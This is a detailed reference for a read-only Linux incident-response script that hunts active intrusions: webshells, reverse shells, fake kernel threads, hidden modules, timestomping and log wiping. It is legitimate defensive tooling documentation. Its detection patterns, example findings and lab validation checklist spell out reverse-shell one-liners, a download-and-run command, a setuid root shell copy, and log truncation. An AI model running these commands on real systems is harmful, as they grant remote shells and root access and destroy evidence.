# `hunt_intrusion.sh` — detailed reference

The in-depth companion doc for the active-intrusion / anomaly hunter. For the two-script overview, see the [`scripts/` index](../README.md); this file explains **exactly what every module reads, how it decides, and why it (almost) never false-positives on a clean host.**

- **Script:** [`hunt_intrusion.sh`](hunt_intrusion.sh) · **version:** 1.1 · **author:** Suvas Patel
- **Sibling:** [`hunt_persistence.sh`](../hunt_persistence/README.md) answers *"what persists on disk."* This one answers *"is an intruder active **right now**, and is the box lying to me about it?"*
- **Cross-refs:** `10 - Live Response and Volatile Data`, `10b - Process Trees and Execution Lineage`, `10c - Network and PCAP Forensics`, `10d - eBPF Tooling for DFIR`, `13b - Anti-Forensics and Evidence Destruction`.

> **Validation status (read first):** v1.1 is **runtime-validated on a stock SANS SIFT (Ubuntu 20.04)** — runs end-to-end as root with `--deep` and returns **`0 HIGH · 0 NOTABLE`** on the clean host. False-positive and performance work is done; what remains is **true-positive** confirmation — run the [validation checklist](#validation-checklist) on a disposable VM to confirm each flagship module fires on a planted artifact.

---

## 1. Design philosophy

Identical to `hunt_persistence.sh`, and worth restating because it is what keeps the false-positive rate near zero:

**Flag on evidence, enumerate everything else.** On Linux almost every "suspicious-shaped" thing is also completely normal — processes spawn shells, files live in `/tmp`, services open sockets. So a *mechanism existing* is never the signal. An item is only raised as an anomaly when it carries **behavioural evidence** (a payload, a reverse-shell socket) or trips a **hard tell** (a kernel-thread name on a process that has a real executable; a port the kernel knows about but `ss` denies).

The difference from the persistence hunter is the **lens**: instead of scoring on-disk persistence config, this script reasons about **live process behaviour, relationships, and the discrepancies a compromised host produces when it lies to its own tools.**

### Safety contract (unchanged)

- **Read-only / non-destructive.** Only reads: `/proc/*`, `readlink`, `stat`, `find`, `ss`/`ps`/`lsmod`/`bpftool` *queries*, package-DB queries. Nothing is written, killed, unmounted, or unloaded.
- **Console-only**, or **`--json`** NDJSON to stdout. No temp files, no host footprint.
- **`root`-optional.** Non-root loses most `/proc/*/exe`, `/proc/*/fd`, `maps`, `mountinfo`, and other users' files; it degrades with a banner rather than failing.

---

## 2. The scoring engine

Reused verbatim from the persistence hunter, so the two scripts read and rank findings identically.

| Piece | Role |
|---|---|
| `scan_cmd "$str"` | The shared payload detector. Tight regex for reverse shells (`/dev/tcp`, `bash -i`, `nc -e`, `socat exec`), download-exec (`curl…\|sh`), decode-exec (`base64 -d…\|sh`), interpreter shells, temp-path execution, hidden system paths, obfuscated `eval`. Each match adds weighted evidence. |
| `ev N REASON` | Add `N` points of evidence tagged `REASON` (deduped). |
| `finish_item` | If accumulated evidence ≥ 3 → queue at a tier: **`[HIGH]` ≥ 5**, **`[NOTABLE]` ≥ 3**. Used where evidence *stacks*. |
| `queue_abs TIER …` | A hard tell — bypasses stacking and queues straight at `TIER`. Used for unambiguous signals (fake kthread, reverse-shell socket, hidden module). |
| `susp_exe "$exe"` | Shared judgement of a process's backing binary → returns a reason if it is `memfd`/tmpfs/deleted-and-gone/hidden/unowned, else empty. The **unowned** verdict is **gated to an incident window** (`--since`/`--days`) — see [FP model](#4-the-false-positive-model). |

**Evidence weights** (from `scan_cmd` + module-specific `ev` calls):

| Reason | Weight | Meaning |
|---|--:|---|
| `REVERSE-SHELL`, `DOWNLOAD-EXEC`, `DECODE-EXEC`, `SCRIPT-SHELL` | 5 | behavioural payload → HIGH on its own |
| `TEMP-PATH` | 4 | executes from `/tmp` · `/dev/shm` · `/var/tmp` |
| `SVC-SPAWNED-SHELL` | 4 | a network/data service is the parent of a shell (webshell/RCE) |
| `SUSPECT-EXE`, `LIVE-NETTOOL`, `GTFOBIN-ESCAPE`, `EVAL-OBFUSCATED` | 3 | strong context; NOTABLE alone, HIGH when stacked |
| `HIDDEN-SYSPATH`, `INLINE-INTERP`, `ZERO-NS-MTIME`, `RECENT` | 2 | modifier; only promotes when combined |

---

## 3. Output model

Every run prints (unless `--json`):

1. **HOST TRIAGE** — hostname, distro, kernel, virt, boot time, package manager, live-PID count, incident-window state.
2. **Per-module sections** — inventory lines for the surface (listeners, BPF programs, per-user history state…), for you to eyeball.
3. **ANOMALIES** — the ranked queue: `[HIGH]` then `[NOTABLE]`, each with a one-line `why`, then a `N HIGH · M NOTABLE` tally. **~empty on a clean host.**

### Reading a finding

```
[HIGH] netshell: pid 4211 (bash)
   where: /proc/4211/fd → socket:[883012]
   what : REVERSE-SHELL — a shell/interpreter with its stdio wired to a socket ; peer 5.9.10.20:443 ; exe=/bin/bash
   why  : REVERSE-SHELL — …          ← the evidence / hard tell that fired
```

### `--json` (NDJSON for fleet rarity stacking)

With `--json`, human output is suppressed and each finding **and** key inventory fact is streamed as one JSON object per line:

```json
{"type":"finding","host":"web01","ts":"2026-07-08T14:22:05Z","module":"lineage","tier":"HIGH","label":"php-fpm -> bash","where":"pid 8123 (ppid 811 php-fpm)","why":"SVC-SPAWNED-SHELL DOWNLOAD-EXEC"}
{"type":"inventory","host":"web01","ts":"2026-07-08T14:22:05Z","module":"netshell","label":"listener 0.0.0.0:22","where":"pid 811","why":"/usr/sbin/sshd"}
```

Fields: `type` (`finding`|`inventory`), `host`, `ts` (UTC ISO-8601), `module`, `tier`, `label`, `where`, `why`. Aggregate across N hosts and **rank by least-frequency-of-occurrence** — the rarest lineage edge / listener / finding is the outlier a single host can't see.

---

## 4. The false-positive model

The modules split into two confidence classes, and the doc is honest about which is which:

- **Hard tells (near-zero FP)** — `lineage` (service→shell), `netshell` (stdio→socket), `masquerade` (fake kthread), `hidden` (cross-view diffs). These key on things an attacker cannot cheaply fake and a clean host does not produce.
- **Best-effort (treat NOTABLE as a lead)** — `ebpf`, `nsmask`, `timestomp`, `clustering`, `elf`. Useful, but they depend on tool availability (`readelf`, `stat %W`) or heuristics that need analyst confirmation.

Structural FP guards, applied everywhere:

- **Unowned ≠ alert.** A process's unowned backing binary is only raised **inside an incident window** (`--since`/`--days`) — on app servers, unpackaged binaries (`node`, `python`, `/opt` builds) are the norm. This also means a routine sweep does **zero** per-process package queries.
- **`scan_cmd` is precision-first.** It matches *download-exec / decode-exec / reverse-shell* shapes, not "contains curl."
- **Known-good exclusions per module** — inetd/socket-activated services (netshell), `cron→shell` without a payload (lineage), packaged files (timestomp — `tar` legitimately zeroes nanoseconds), container bind-mounts (nsmask), inline `python -c` (argv — common in cloud-init/ansible, so it's a weight-2 modifier, not a finding).
- **`TEMP-PATH` means executes *from* temp, not mentions temp.** In `argv` the `/tmp`·`/dev/shm`·`/var/tmp` signal counts only when **argv[0] or the real `/proc/PID/exe`** lives in a volatile dir — a `/tmp` path passed as an *option value* (a JVM's `-Djava.io.tmpdir=/tmp/…`, a `--cache-dir`) does not fire.
- **Container / namespaced processes are judged as host scope, not container internals.** `elf` only analyses a process whose `exe` resolves to a **regular, parseable ELF on the host**; a container process whose `exe` reads back as `/` (a directory) or a non-host path is skipped, not mislabeled. Container-layer file scans (`/var/lib/docker`, `/snap`) are out of scope by design — that's the container tooling's job.

---

## 5. Modules in depth

Default run order: `lineage netshell masquerade argv hidden ebpf nsmask timestomp clustering loggaps elf` (limit with `--modules a,b,c`).

### `lineage` — impossible process parentage
- **Reads:** for every live PID, `/proc/PID/comm`, `/proc/PID/status` (PPid), the parent's `comm`, and `/proc/PID/cmdline`.
- **Decides:** only considers processes whose own name is a shell / interpreter / net-tool. Then:
  - **parent is a network/data service** (`nginx`, `apache2`, `php-fpm`, `mysqld`, `postgres`, `mongod`, `sshd`, …) → `SVC-SPAWNED-SHELL` (4) + `scan_cmd` on the child's command + `+3` if the child's exe is suspicious → **webshell / RCE**. A web server should never be the parent of a shell.
  - **parent is `cron`/`atd`/`anacron`** → *only* flags if `scan_cmd` finds a payload (cron running a shell is normal; cron running `curl…|sh` is not).
  - **the process itself is `nc`/`ncat`/`socat`** → `LIVE-NETTOOL` (3) + `scan_cmd` — an interactive networking tool running right now.
- **FP guards:** `sshd → shell` is *not* flagged (that's a normal interactive login; a malicious SSH shell is caught by `netshell` via its socket stdio). `cron → shell` needs a payload.
- **Example:** `[HIGH] lineage: php-fpm -> bash` — `pid 8123 (ppid 811 php-fpm)` running `bash -c 'curl http://x/c|bash'`.
- **Limits:** legitimate web→shell exists (deploy hooks, CI runners, apps that shell out) → those surface as `[NOTABLE]` for you to clear.

### `netshell` — network-backed shells + rogue listeners
- **Reads:** `/proc/PID/fd/{0,1,2}` (stdin/out/err), `/proc/PID/comm`, `/proc/PID/exe`; resolves the socket inode against `/proc/net/tcp{,6}` / `udp{,6}`; `ss -tulpnH` for listeners.
- **Decides:** if any of fd 0/1/2 is a `socket:[inode]` **and** the process is a shell/interpreter/net-tool (or its exe is suspicious) → **`[HIGH]` reverse/bind shell**, with the remote peer resolved (`hex → dotted IPv4`). Separately, any **listener whose backing binary is suspicious** (tmp/deleted/unowned) → `[HIGH]` rogue listener.
- **FP guards:** legitimate socket-activated (`systemd`) and `inetd`/`xinetd` services also have socket stdio — but they are **packaged daemons, not shells**, so the shell/interpreter/`susp_exe` condition excludes them.
- **Example:** `[HIGH] netshell: pid 4211 (bash) … socket:[883012] … peer 5.9.10.20:443`.
- **Limits:** IPv6 peers are shown as raw hex; a reverse shell that `dup2`s the socket only onto a non-standard fd (not 0/1/2) is missed (rare — reverse shells want a working stdio).

### `masquerade` — fake kernel threads & process disguises
- **Reads:** `/proc/PID/comm`, `/proc/PID/exe`, `/proc/PID/cmdline`.
- **Decides:**
  - **Fake kernel thread** — a process whose name matches a kthread pattern (`kworker`, `ksoftirqd`, `rcu_`, `kthreadd`, …) **but has a real `exe` or `cmdline`** → `[HIGH]`. Real kernel threads have *neither*; an implant hiding as `[kworker/0:1]` will have both.
  - **`comm` ends in whitespace** → `[NOTABLE]` (a `ps` alignment/hiding trick).
  - **`comm` contains a non-ASCII / control char** → `[NOTABLE]` (homoglyph/hiding).
  - **suspicious backing exe** (`susp_exe`) → `[HIGH]` fileless/relocated binary.
- **Example:** `[HIGH] masquerade: [kworker/0:1]` with `exe=/tmp/.x`.
- **Limits:** the fileless check overlaps with the persistence hunter's `procscan` — intentional; the two run independently.

### `argv` — payloads in live command lines
- **Reads:** `/proc/PID/cmdline` for every live PID.
- **Decides:** `scan_cmd` for payload shapes + `INLINE-INTERP` (2) for `python -c` / `perl -e` (weak — common) + `GTFOBIN-ESCAPE` (3) for `find … -exec sh`, `awk 'BEGIN{system()}'`, `tar --checkpoint-action`, etc. Queues at ≥3.
- **Example:** `[HIGH] argv: pid 900 (sh)` running `sh -i >& /dev/tcp/10.0.0.5/9001 0>&1`.
- **Limits:** heavy obfuscation/encryption in argv can evade the regex; catches fileless execution that leaves nothing on disk.

### `hidden` — cross-view "the box is lying to itself" diffs
- **Reads / compares:** `/proc/[0-9]*` vs `ps -e`; `/proc/net/tcp{,6}` LISTEN ports vs `ss -tln`; `/proc/modules` vs `lsmod`.
- **Decides:** a PID in `/proc` but not `ps` → `[NOTABLE]` **hidden PID** (with a "re-run to rule out a start/exit race" caveat); a listening port in `/proc/net` that `ss` denies → `[NOTABLE]` **hidden port**; a module in `/proc/modules` absent from `lsmod` → `[HIGH]` **hidden module** (self-hiding LKM). A discrepancy between two views of one truth *is* the rootkit.
- **Limits:** hidden-PID/-port can race on a busy host (hence NOTABLE + re-run advice); a rootkit that hooks *both* views consistently will not diff (confirm in memory).

### `ebpf` — BPF hooking without an agent
- **Reads:** `bpftool prog show`; `/sys/kernel/debug/kprobes/list`, `kprobe_events`.
- **Decides:** counts BPF programs using kernel-**hooking** attach types (`kprobe`/`fentry`/`fexit`/`lsm`/`raw_tracepoint`); if any exist **and** no known BPF agent is running (`falco`, `cilium-agent`, `datadog-agent`, `bpftrace`, `tetragon`, `sysdig`, `kubearmor`, `pixie-agent`) → `[NOTABLE]` unexplained hooking. kprobe files are inventoried.
- **Limits:** best-effort — it flags *hooking with no known agent*, not "malicious"; a custom-but-legit BPF tool will surface as NOTABLE. No `bpftool` → the check is skipped with a note.

### `nsmask` — bind-mount / namespace masking
- **Reads:** `/proc/1/mountinfo`.
- **Decides:** a filesystem mounted **over an individual system file** (`/usr/sbin/sshd`, `/etc/ld.so.preload`, a binary in `/usr/bin`…) → `[HIGH]` hide-a-file / binary-swap. Common legitimate file bind-mounts (`/etc/hostname`, `/etc/resolv.conf`, `/etc/hosts`, `/etc/machine-id`, `/etc/localtime`, `/etc/nsswitch.conf`) are allow-listed.
- **Limits:** the broader "process in a non-init namespace" check was **deliberately dropped** — hardened `systemd` services (`PrivateTmp`, `ProtectSystem`) legitimately run in private mount namespaces, making it a false-positive magnet. Only the tight bind-over-file signal ships.

### `timestomp` — mtime forgery on unowned files
- **Reads:** for **unowned** files (packaged files skipped) in `/tmp`, `/var/tmp`, `/dev/shm`, web roots, `/root` (and, with `--deep`, system bin dirs + `/etc`): `stat %Y` (mtime), `%W` (birth/crtime), `%y` (nanoseconds).
- **Decides:** birth-time **later** than mtime → `[NOTABLE]` (mtime was set backwards — physically impossible without tampering); a **zeroed-nanosecond** mtime (the `touch -d` signature) on an unowned file → `ev 2` (+2 if recent) → NOTABLE when it lands.
- **FP guards:** packaged files are excluded because `tar` legitimately stores second-granularity → *every* packaged file has `.000000000` nanoseconds. `%W` is only trusted when > 0 (many filesystems don't record birth time).
- **Limits:** birth time is unavailable on some FS/kernels → that check silently no-ops there.

### `clustering` — the "install event" (needs a window)
- **Reads:** `find … -newermt @since -printf '%T@ %p'` across `/etc`, `/usr/local`, `/opt`, web roots, `/root`, `/home`, bin dirs (+ `/usr/lib`, `/lib` with `--deep`).
- **Decides:** buckets window-modified files into 5-minute bins; a bin holding **≥ 4 files across ≥ 2 directories** → `[NOTABLE]` install-event (an automated drop touches many paths at once; a human edits one). Requires `--since`/`--days`.
- **Limits:** a legitimate `apt upgrade` inside the window also clusters — read the sample paths; the value is *ranking when to look*, not a verdict.

### `loggaps` — anti-forensics & audit evasion
- **Reads:** `auditctl`/`auditd` state; `/var/log/{wtmp,btmp,lastlog,auth.log,secure,syslog,messages}`; `journald.conf`; per-user shell rc files + `~/.bash_history`.
- **Decides (all `[NOTABLE]`):** auditd installed but **not running**; a login/system log (`wtmp`/`lastlog`/`auth.log`/`secure`/`syslog`/`messages`) that is **empty or a symlink** on a running host (wiping) — `btmp` records *only failed logins*, so its **emptiness** is treated as evidence only inside an incident window (`--since`/`--days`), while a `btmp` **symlink** is always flagged; journald `Storage=none|volatile`; shell init that **disables history** (`HISTFILE=/dev/null`, `unset HISTFILE`, `HISTSIZE=0`, `history -c`, `set +o history`); `~/.bash_history` symlinked to `/dev/null`.
- **Limits:** overlaps intentionally with the persistence hunter's `shell` module (different lens — evasion vs persistence).

### `elf` — setuid interpreters & ELF anomalies
- **Reads:** `find -perm -4000` across bin dirs + `/tmp`/`/home`/`/opt`; `readelf -l/-d`, `file`, `grep UPX!` on **unowned running** binaries.
- **Decides:** a **setuid-root interpreter/shell** (`bash`, `python`, `perl`, `awk`, `find`, `env`, `nc`, …) anywhere → `[HIGH]` (instant privilege-escalation backdoor). On an unowned running binary: UPX-packed / RWX LOAD segment / statically-linked / musl interpreter → `[NOTABLE]` ELF anomaly.
- **FP guards:** ELF-content checks run **only on unowned** binaries (packaged Go/static daemons would otherwise flood); standard lib dirs skipped; the target must be a **regular, parseable ELF** — a `readelf` failure can never become a finding, so a namespaced/container process whose `exe` resolves to `/` (a directory) or a non-ELF path is skipped rather than mislabeled "static-linked".
- **Limits:** needs `readelf`/`file`; "static-linked" alone is weak on Go-heavy hosts (hence unowned-only + NOTABLE).

---

## 6. Options

| Option | Effect |
|---|---|
| `--since YYYY-MM-DD` | Incident window — enables `clustering`, widens the unowned nets, promotes recent items |
| `--days N` | Incident window — last N days |
| `--deep` | Widen slow sweeps: `timestomp` + `clustering` over system bin/lib dirs |
| `--modules a,b,c` | Limit to: `lineage netshell masquerade argv hidden ebpf nsmask timestomp clustering loggaps elf` |
| `--min-severity T` | Anomaly filter: `high` \| `notable` (default: both) |
| `--inventory-only` | Triage + inventory, skip the anomaly scan |
| `--anomalies-only` | Skip the inventory listing |
| `--json` | Emit findings + key facts as NDJSON (one object per line) for fleet aggregation |
| `-h`, `--help` | Usage |

---

## 7. Strengths & weaknesses

**Strengths.** Catches the *active-intrusion* layer the persistence hunter can't — reverse shells and webshells that leave little on disk. The flagship checks are read-only and near-zero-FP because they key on things an attacker can't cheaply fake (a kthread with a real exe; a shell whose stdio *is* a socket; a port `ss` can't see). `--json` turns single-host triage into fleet rarity stacking. Same engine as `hunt_persistence.sh`, so findings read and rank identically.

**Weaknesses.** Point-in-time — a dormant implant that isn't running is invisible, and a kernel rootkit that hooks *both* sides of a cross-view diff can still hide (confirm in memory — `11 - Memory Forensics`). Several modules are best-effort (`ebpf`, `nsmask`, `timestomp`, `clustering`, `elf`) and depend on tool availability / heuristics — treat their `[NOTABLE]`s as leads, not verdicts. Needs root for full coverage.

---

## 8. Validation checklist

Run on a **clean lab host** first — expect `0 HIGH · 0 NOTABLE` (a few best-effort NOTABLEs are acceptable; investigate any HIGH). Then confirm each flagship module fires on a planted artifact (in a disposable VM):

| Module | Plant (lab only) | Expect |
|---|---|---|
| `netshell` | `bash -i >& /dev/tcp/127.0.0.1/9001 0>&1` (with a local listener) | `[HIGH]` REVERSE-SHELL, peer resolved |
| `lineage` | from a PHP page: `system('bash -c "sleep 60"')` under `php-fpm` | `[HIGH]` `php-fpm -> bash` |
| `masquerade` | copy `/bin/sleep` to `/tmp/x`, run it, then `prctl`/`exec -a '[kworker/0:9]'` | `[HIGH]` FAKE-KTHREAD |
| `argv` | `python3 -c 'import socket,subprocess,os;...'` | `[HIGH]` SCRIPT-SHELL |
| `hidden` | load a test LKM that unlinks itself from `lsmod` | `[HIGH]` HIDDEN-MODULE |
| `elf` | `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` | `[HIGH]` SETUID-INTERP |
| `loggaps` | `: > /var/log/wtmp` (on a scratch box) | `[NOTABLE]` ZEROED-LOG |

Also run `--json` and confirm each line is valid JSON (`… | jq .`), and `--anomalies-only` / `--min-severity high` to confirm the filters behave.

Remove every planted artifact afterwards.

- **v1.0** — Initial release. Eleven modules (`lineage netshell masquerade argv hidden ebpf nsmask timestomp clustering loggaps elf`) on the persistence hunter's engine verbatim — same evidence weights and `[HIGH]`/`[NOTABLE]` tiers, the `--since`/`--days`/`--deep`/`--modules`/`--min-severity`/`--inventory-only`/`--anomalies-only` flags, plus `--json` NDJSON for fleet rarity stacking.
